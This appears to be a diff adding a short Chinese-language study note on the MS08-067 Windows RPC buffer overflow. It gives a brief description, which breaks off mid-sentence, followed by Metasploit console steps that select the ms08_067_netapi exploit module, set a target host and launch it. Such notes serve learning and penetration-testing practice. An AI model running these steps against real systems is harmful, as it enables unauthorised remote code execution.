@@ -1,0 +1,11 @@
+漏洞端口445  3389
+MS08-067漏洞的全称为“Windows Server服务RPC请求缓冲区溢出漏洞”，如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。在 Microsoft Windows 2000Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码，此漏洞可用于进行蠕虫攻击，目前已经有利用该漏洞
+
+打开cmder
+msfconsole
+1.search ms08-067
+2.use  exploit/windows/smb/ms08_067_netapi
+3.set rhost  ip地址
+4.exploit
+
+run
